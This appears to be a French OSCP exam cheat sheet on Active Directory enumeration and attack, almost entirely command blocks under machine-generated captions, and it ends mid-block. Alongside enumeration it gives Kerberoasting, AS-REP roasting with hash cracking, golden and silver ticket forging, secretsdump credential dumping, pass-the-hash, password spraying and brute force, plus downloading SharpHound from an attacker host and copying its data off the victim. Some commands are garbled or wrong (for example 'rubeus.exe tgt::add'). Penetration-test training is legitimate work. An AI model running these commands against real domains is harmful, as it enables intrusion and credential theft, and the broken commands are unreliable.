---
title: "OSCP · Active Directory : énumération"
description: "Identifier les utilisateurs, groupes, services et relations du domaine."
---

# OSCP · Active Directory : énumération

Identifier les utilisateurs, groupes, services et relations du domaine.


## Reconnaissance avec Nmap

Vérifier les ports et les services de la cible autorisée.


Identifier les versions des services.

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 -sS -sV -oA ad-enum <target-ip>
```


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
```


Rechercher des chemins ou paramètres web.

```bash
gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
```


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
```


Commande `./kerbrute_linux_amd64` pour la rubrique « Reconnaissance avec Nmap ».

```bash
# Using Kerbrute
./kerbrute_linux_amd64 userenum -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames

# Using CrackMapExec
crackmapexec smb [domain].com -u '' -p '' --users
```


Commande `impacket-getadusers` pour la rubrique « Reconnaissance avec Nmap ».

```bash
# Using GetAdUsers.py (same tool)
impacket-GetADUsers -all -dc-ip <dc_ip> -u <username> -p <password> <domain>

# Using Enum4Linux
enum4linux -a -u "<username>" -p "<password>" <dc_ip>
```


### Énumération DNS (Port 53)

Interroger les enregistrements DNS et identifier les services associés.


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>
```


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap -p 53 --script "dns-nsid,dns-srv-enum" <target_ip>
```


Interroger les enregistrements DNS.

```bash
dig axfr @<dc-ip> <domain>
```


Interroger les enregistrements DNS.

```bash
dig A <domain> @<dc-ip>
dig SRV _ldap._tcp.dc._msdcs.<domain> @<dc-ip>
```


Interroger les enregistrements DNS.

```bash
dig axfr <domain_name> @<dns_server_ip>  # Attempt zone transfer
dig ANY <domain_name> @<dns_server_ip>  # Retrieve all records
nslookup
> server <dns_server_ip>
> set type=any
> <domain_name>  # Query any records
```


Interroger les enregistrements DNS.

```bash
dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr

dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain_name>
```


Examiner les ports et les services avec Nmap.

```bash
nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a range
```


Interroger les enregistrements DNS.

```bash
dig @<dns_server_ip> -t A +norecurse <target_domain>
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
```


### Énumération Kerberos (port 88)

Vérifier les ports et les services de la cible autorisée.


Examiner le service avec les scripts NSE sélectionnés.

```bash
# Check for Kerberos service availability and get basic information
nmap -p 88 --script kerberos-enum-users <target_ip>

# Check for common Kerberos vulnerabilities
nmap -p 88 --script kerberos-brute <target_ip>

# Enumerate SPNs (Service Principal Names)
nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
```


Commande `getnpusers.py` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# This is the same tool as impacket-GetNPUsers.
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc-ip> -format hashcat
# Autre possibilité
GetNPUsers.py <domain>/ -no-pass -usersfile <path_to_userlist> -dc-ip <domain_controller_ip>

# Crack the found hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```


Commande `getuserspns.py` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip>

# Crack the resulting hash
hashcat -m 13100 kerberoast.txt rockyou.txt
```


Commande `kerbrute` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
kerbrute userenum -d <domain> -p <userlist> <target_ip>
# Autre possibilité
./kerbrute_linux_amd64 userenum -d <target_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```


Commande `impacket-getnpusers` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>
```


Commande `impacket-gettgt` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
```


Analyser une empreinte avec le mode indiqué.

```bash
john --wordlist=<wordlist> <ticket_file>
# or
hashcat -m 13100 <ticket_file> <wordlist>
```


Commande `python3` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# Request a TGT (Ticket Granting Ticket)
python3 GetTGT.py -dc-ip <dc_ip> <domain>/<username>:<password>

# Request a Service Ticket (TGS)
python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>
```


Commande `impacket-getuserspns` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# Extract all service tickets for offline cracking
impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>

# Crack the extracted tickets with John the Ripper or Hashcat
john --wordlist=<wordlist> <tickets_file>
# or
hashcat -m 13100 <tickets_file> <wordlist>
```


Commande `krb5-brute` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
```


Commande `python3` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# Renew a TGT (for Kerberos ticket manipulation)
python3 psexec.py <domain>/<username>:<password>@<target_ip> -impersonate-user <target_user>

# Perform Kerberos attacks with Rubeus
rubeus.exe asktgt /user:<username> /rc4:<password>
rubeus.exe tgtdeleg /user:<username> /rc4:<password>
rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
```


Commande `mimikatz` pour la rubrique « Énumération Kerberos (port 88) ».

```powershell
# Dump Kerberos tickets from memory using Mimikatz
mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
```


Commande `python3` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# Test for weak pre-authentication configurations
python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
```


Commande `rubeus.exe` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# Create a silver ticket with Rubeus
rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
```


Commande `impacket-gettgt` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# 1. Obtain a Valid TGT (Ticket Granting Ticket)
impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>

# 2. Forge a Silver Ticket
impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>
```


Commande `rubeus.exe` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# Create a golden ticket with Rubeus
rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
```


Commande `impacket-secretsdump` pour la rubrique « Énumération Kerberos (port 88) ».

```bash
# 1. Obtain KRBTGT NTLM Hash
impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>

# 2. Generate a Golden Ticket
ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>

# 3. Use the Golden Ticket
impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>

# (Optional) Pass the Golden Ticket
impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
```


### Énumération LDAP (ports 389 et 636)

Vérifier les ports et les services de la cible autorisée.


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap -n -sV --script "ldap* and not brute" <target_ip>
```


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=*)"
# Autre possibilité
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
```


Interroger les objets de l'annuaire LDAP.

```bash
# Énumérer les utilisateurs du domaine
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName

# Énumérer les groupes du domaine
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=group)" cn
```


Interroger les objets de l'annuaire LDAP.

```bash
# Basic LDAP query
ldapsearch -x -H ldap://<target_ip>

# Basic LDAP Search for a base-level
ldapsearch -h <target_ip> -x -s base

# Afficher les contextes de nommage LDAP
ldapsearch -x -H ldap://<target_ip> -s base namingcontexts

# Search in a Specific Base Domain Name
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"

# Enumerate users using LDAP
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"

# Retrieve users Account Name
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:

# Search with Filters
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"

# Searching with authentication
ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"

# Searching terms
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "[term]"

# Specifies the value term to return
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>
```


Commande `kerbrute` pour la rubrique « Énumération LDAP (ports 389 et 636) ».

```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
```


Exemple technique pour la rubrique « Énumération LDAP (ports 389 et 636) ».

```bash
# Search Terms to Find Cleartext Passwords
# Search for ms-MCS-AdmPwd (local administrator passwords)
(ms-MCS-AdmPwd=*)

# Search for attributes containing 'password' in description
(description=*password*)

# Search for LAPS expiration time (to identify potential password management)
(ms-MCS-AdmPwdExpirationTime=*)

# Search for common weak passwords in attributes like description
(description=*(123456*|password*|qwerty*|letmein*))

# General LDAP Search Filters
# Search for All Users
(objectClass=user)

# Search for All Computers
(objectClass=computer)

# Search for All Groups
(objectClass=group)

# Search for Disabled Accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Search for Expired Accounts
(& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))

# Search for Specific Group Membership
(&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Search for Users with Specific Attributes
# For users with a specific email domain
(mail=*@example.com)
# For users with a specific title
(title=Manager)

# Specific Attributes

# Search for Password Last Set
(pwdLastSet=*)

# Search for Accounts with Expired Passwords
(& (objectClass=user)(pwdLastSet<=0))

# Search for Accounts in a Specific Organizational Unit (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Security-Related Searches

# Search for Accounts with Kerberos Pre-Authentication Disabled
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Search for Service Principal Names (SPNs)
(servicePrincipalName=*)

# Search for Delegated Users
(msDS-AllowedToDelegateTo=*)

# Search for Accounts with Privileges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Other Useful Searches

# Search for All Organizational Units
(objectClass=organizationalUnit)

# Search for Active Directory Certificate Services
(objectClass=cACertificate)

# Search for All Attributes of a Specific User
(sAMAccountName=username)

# Search for Accounts with Specific Notes or Descriptions
(description=*keyword*)

# Search for all objects in the directory
(objectClass=*)

# Search for service accounts
(objectCategory=serviceAccount)

# Search for accounts with specific group memberships (replace 'GroupName')
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Search for computer accounts
(objectClass=computer)

# Search for users in a specific organizational unit (replace 'OU=Users')
(ou=OU=Users,DC=domain,DC=com)

# Search for all accounts with specific attributes
(pwdLastSet=0)
```


### Énumération SMB (port 445)

Vérifier les ports et les services de la cible autorisée.


Examiner les ports et les services avec Nmap.

```bash
# Nmap scan
nmap -v -p 139,445 [IP]
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>

# NetBIOS Scan
sudo nbtscan -r 192.168.50.0/24

# Windows Network View
net view \\[domainName] /all
```


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap --script smb-enum-shares.nse -p445 <ip>

nmap --script smb-enum-users.nse -p445 <ip>

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 <ip>

nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 <ip>

nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <ip>
```


Énumérer les informations SMB ou RPC.

```bash
# Use smbclient or enum4linux to enumerate SMB shares.
smbclient -L //<dc-ip> -U "guest"

# List shares using CrackMapExec (CME).
crackmapexec smb <dc-ip> -u '' -p '' --shares
```


Énumérer les informations SMB ou RPC.

```bash
# Perform null session enumeration to list domain users.
rpcclient -U "" <dc-ip> --command="enumdomusers"

# Or use CME for RID cycling.
crackmapexec smb <dc-ip> --rid-brute
```


Commande `ngrep` pour la rubrique « Énumération SMB (port 445) ».

```bash
# Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139

# Lists available SMB shares on the target
smbclient -L <IP>
```


**Paramètres et repères :**
`smbmap`  


Énumérer les informations SMB ou RPC.

```bash
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u guest -p "" --rid-brute
crackmapexec smb <IP> -u '[user]' -p '[password]'
```


Énumérer les informations SMB ou RPC.

```bash
# Basic information gathering on the domain
enum4linux -a <IP>
enum4linux -a -u "" -p "" <IP> && enum4linux -a -u "guest" -p "" <IP>

# Extract domain users
enum4linux -U <DOMAIN_IP>

# Extract available domain shares
enum4linux -S <IP>

enum4linux -a -M -l -d <ip> 2>&1
enum4linux -a -u "" -p "" <ip>
enum4linux -a -u "guest" -p "" <ip>
enum4linux -a -u "[user]" -p "[password]" <ip>
```


Énumérer les informations SMB ou RPC.

```bash
smbclient --no-pass -L //<ip>
smbclient -L //<ip> -U [user]
smbclient //<IP>/<SHARE>
smbclient -N //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *" # Change the timeout to download big files

# Change the timeout to download big files
help timeout
timeout 100

# Other commands
prompt off
recurse on
mget *
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
```


Commande `mkdir` pour la rubrique « Énumération SMB (port 445) ».

```bash
# Mounts SMB shares to a local directory for further access and manipulation.
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share
```


Commande `psexec.py` pour la rubrique « Énumération SMB (port 445) ».

```bash
# PsExec
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# WMIexec
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# SMBexec
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# AteExec
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```


Commande `psexec.py` pour la rubrique « Énumération SMB (port 445) ».

```bash
# Credentials
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass the Hash
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Testing with Crackmapexec
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
```


Commande `wmiexec.py` pour la rubrique « Énumération SMB (port 445) ».

```bash
# Credentials
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass the Hash
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Testing with Crackmapexec
crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
```


### Énumération WinRM (port 5985)

Vérifier les ports et les services de la cible autorisée.


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap -p 5985,5986 --script winrm-info $IP
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec winrm <dc-ip> -u <username> -p <password>
```


Commande `evil-winrm` pour la rubrique « Énumération WinRM (port 5985) ».

```bash
evil-winrm -i <dc-ip> -u <username> -p <password>
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
```


Commande `enter-pssession` pour la rubrique « Énumération WinRM (port 5985) ».

```powershell
# Using PowerShell to connect to WinRM
Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
```


## Énumération de base

![Descripción de la imagen](https://www.emmanuelsolis.com/img/AD_Methodology.png)


Exemple technique pour la rubrique « Énumération de base ».

```powershell
# Using PowerShell
(Get-ADDomain).DomainSID

# Using CMD
whoami /user

# Using vmic
wmic useraccount where name='[usernameToFind]' get sid
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
# Using PowerShell
Get-ADDomainController -Filter *

# Using nltest
nltest /dclist:[YourDomainName]

# Using netdom
netdom query dc

# Using nslookup
nslookup yourdomain.com

# Using ADUC
# Open ADUC --> In the Domain Controllers Organizational Unit (OU), you can find the domain controllers listed there.
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
# Using PowerShell
# List All User Accounts with Service Principal Names (SPNs)
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
# Find Specific Service Accounts (e.g., SQL Server)
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# Checking Running Services
Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne "LocalSystem" -and $_.StartName -ne "LocalService" -and $_.StartName -ne "NetworkService" } | Select-Object Name, StartName
# Autre possibilité
sc queryex type= service

# Using nltest
nltest /domain_trusts

# Identify Specific Service Account by SPN
Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames

# Using ADUC
Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.
```


Examiner les informations AD ou réseau en PowerShell.

```bash
# PowerShell
  Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
  
  # Bash (Kali)
  ldapsearch -x -h <DC_IP> -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName
  
```


Commande `net` pour la rubrique « Énumération de base ».

```bash
net user /domain
net user [username] /domain
```


Commande `net` pour la rubrique « Énumération de base ».

```bash
net groups /domain
net groups [groupName] /domain
```


Exemple technique pour la rubrique « Énumération de base ».

```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
```


Commande `function` pour la rubrique « Énumération de base ».

```powershell
function Get-SAMInfo {
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DN = ([adsi]'').distinguishedName 
  $LDAP = "LDAP://$PDC/$DN"
  $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
  $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
  $dirsearcher.filter = "samAccountType=805306368"
  $dirsearcher.FindAll() | ForEach-Object {
      $_.Properties
  }
}
```


Exemple technique pour la rubrique « Énumération de base ».

```powershell
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=[GroupName]))"
```


Commande `function` pour la rubrique « Énumération de base ».

```powershell
function LDAPSearch {
  param ([string]$LDAPQuery)
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DistinguishedName = ([adsi]'').distinguishedName
  $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
  $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
  return $DirectorySearcher.FindAll()
}
```


Interroger les objets de l'annuaire LDAP.

```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```


Interroger les objets de l'annuaire LDAP.

```powershell
LDAPSearch -LDAPQuery "(objectclass=group)"
```


Exemple technique pour la rubrique « Énumération de base ».

```text
$group
```


Commande `foreach` pour la rubrique « Énumération de base ».

```powershell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
  $group.Properties | Select-Object {$_.cn}, {$_.member}
}
```


## PowerView


Commande `import-module` pour la rubrique « PowerView ».

```powershell
Import-Module .\PowerView.ps1
```


**Paramètres et repères :**
`Get-NetDomain`  


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADDomainController -Discover
```


**Paramètres et repères :**
`Get-NetUser`  


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetUser | Select-Object [attributes]
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetGroup | Select-Object [attributes]
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetComputer | Select-Object [attributes]
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetGroup -GroupName "Domain Admins"
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetUser -SPN
```


**Paramètres et repères :**
`Get-NetDomainController` · `Get-NetShare`  


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetUser -Delegation
```


## Service Principal Names (SPN) Énumération

Examiner les objets, les droits et les services du domaine.


Commande `setspn` pour la rubrique « Service Principal Names (SPN) Énumération ».

```bash
setspn -L [service]
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
```


## Énumération des permissions d'objets


**Paramètres et repères :**
`GenericAll` · `GenericWrite` · `WriteOwner` · `WriteDACL`  
`AllExtendedRights` · `ForceChangePassword` · `Self` · `Get-ObjectAcl`  


Commande `get-objectacl` pour la rubrique « Énumération des permissions d'objets ».

```powershell
Get-ObjectAcl -Identity [username]
```


Commande `convert-sidtoname` pour la rubrique « Énumération des permissions d'objets ».

```powershell
Convert-SidToName [SID]
```


Commande `get-objectacl` pour la rubrique « Énumération des permissions d'objets ».

```powershell
Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object SecurityIdentifier, ActiveDirectoryRights
```


Exemple technique pour la rubrique « Énumération des permissions d'objets ».

```powershell
"[SID1]", "[SID2]" | Convert-SidToName
```


Commande `net` pour la rubrique « Énumération des permissions d'objets ».

```bash
net group "[GroupName]" [username] /add /domain
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetGroup "[GroupName]" | Select-Object member
```


## Énumération des partages du domaine

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`Find-DomainShare`  


Commande `gpp-decrypt` pour la rubrique « Énumération des partages du domaine ».

```bash
gpp-decrypt [encrypted_password]
```


## BloodHound & SharpHound

Examiner les objets, les droits et les services du domaine.


Commande `invoke-webrequest` pour la rubrique « BloodHound & SharpHound ».

```powershell
# Download the PowerShell version of SharpHound
Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.ps1" -OutFile "C:\Temp\sharphound.ps1"

# Alternatively, you can download the .exe version
Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\sharphound.exe"
```


Commande `nltest` pour la rubrique « BloodHound & SharpHound ».

```powershell
# Find your domain name
nltest /dclist:domainname
# Autre possibilité
Get-ADDomainController -Discover

# Run SharpHound to collect domain data (using the .exe)
.\SharpHound.exe -c All
# Autre possibilité
.\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData
```


Commande `import-module` pour la rubrique « BloodHound & SharpHound ».

```powershell
# Import the SharpHound script into memory
Import-Module .\SharpHound.ps1

# Collect all data from the domain
Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Temp
```


**Paramètres et repères :**
`All`  


Commande `invoke-bloodhound` pour la rubrique « BloodHound & SharpHound ».

```powershell
Invoke-BloodHound -CollectionMethod Group
Invoke-BloodHound -CollectionMethod ACL
```


**Paramètres et repères :**
`.zip`  


Commande `c` pour la rubrique « BloodHound & SharpHound ».

```text
C:\Temp
```


Commande `download` pour la rubrique « BloodHound & SharpHound ».

```bash
# Having an Evil-WinRM session
download [bloodhound_file].zip

# SCP from the victim to your Kali
scp user@victim-ip:C:\Temp\*.zip /path/to/your/dir

# Download via a web server
Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip"
```


**Paramètres et repères :**
`https://localhost:7474` · `neo4j:neo4j` · `neo4j:Neo4j`  


Commande `neo4j` pour la rubrique « BloodHound & SharpHound ».

```bash
# Start the Neo4j service in Kali (needed for analyzing the collected data):
sudo neo4j start
```


**Paramètres et repères :**
`bloodhound` · `WriteGPO` · `OwnsGPO`  


Commande `gpo` pour la rubrique « BloodHound & SharpHound ».

```text
GPO control
```


Exemple technique pour la rubrique « BloodHound & SharpHound ».

```text
(NODES)-[:RELATIONSHIP]->(NODES)
```


Commande `match` pour la rubrique « BloodHound & SharpHound ».

```text
MATCH (m:Computer) RETURN m
```


Commande `match` pour la rubrique « BloodHound & SharpHound ».

```text
MATCH (m:User) RETURN m
```


Commande `match` pour la rubrique « BloodHound & SharpHound ».

```text
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```


**Paramètres et repères :**
`SQLAdmin`  


Commande `match` pour la rubrique « BloodHound & SharpHound ».

```text
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```


**Paramètres et repères :**
`CanPSRemote`  


Commande `match` pour la rubrique « BloodHound & SharpHound ».

```text
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```


## Analyse des empreintes de mots de passe

Vérifier les comptes, les secrets et les mécanismes d'authentification.


Commande `secretsdump.py` pour la rubrique « Analyse des empreintes de mots de passe ».

```bash
secretsdump.py <domain>/<username>:<password>@<dc-ip>
```


Analyser une empreinte avec le mode indiqué.

```bash
hashcat -m 1000 ntlm-hashes.txt rockyou.txt
```


Examiner le service distant avec les paramètres fournis.

```bash
# Many more commands can be found in the Section 6.
crackmapexec smb <dc-ip> -u usernames.txt -p password123 --spray
```


## MS-RPRN Print Spooler Service Exploitation


Énumérer les informations SMB ou RPC.

```bash
rpcclient -U "<user>%<password>" <dc-ip> --command="enumprinters"
```


## SPN des comptes de service

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`cifs`  


**cifs**


**Paramètres et repères :**
`dcom`  


**dcom**


**Paramètres et repères :**
`exchange`  


**exchange**


**Paramètres et repères :**
`ftp`  


**FTP**


**Paramètres et repères :**
`http`  


**http**


**Paramètres et repères :**
`imap`  


**imap**


**Paramètres et repères :**
`krbtgt`  


**krbtgt**


**Paramètres et repères :**
`ldap`  


**LDAP**


**Paramètres et repères :**
`mssql`  


**mssql**


**Paramètres et repères :**
`mysql`  


**mysql**


**Paramètres et repères :**
`nfs`  


**nfs**


**Paramètres et repères :**
`oracle`  


**oracle**


**Paramètres et repères :**
`pgsq`  


**pgsq**


**Paramètres et repères :**
`pop3`  


**pop3**


**Paramètres et repères :**
`rpc`  


**rpc**


**Paramètres et repères :**
`smtp`  


**smtp**


**Paramètres et repères :**
`svc`  


**svc**


**Paramètres et repères :**
`termsrv`  


**termsrv**


**Paramètres et repères :**
`wsman`  


**wsman**


## GPP Passwords Abuse (Group Policy Preferences)

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### GPP Main Method for Extraction


Commande `net` pour la rubrique « GPP Main Method for Extraction ».

```powershell
net use z:\\[hostname/domain]\SYSVOL
```


**Paramètres et repères :**
`Groups.xml`  


Exemple technique pour la rubrique « GPP Main Method for Extraction ».

```text
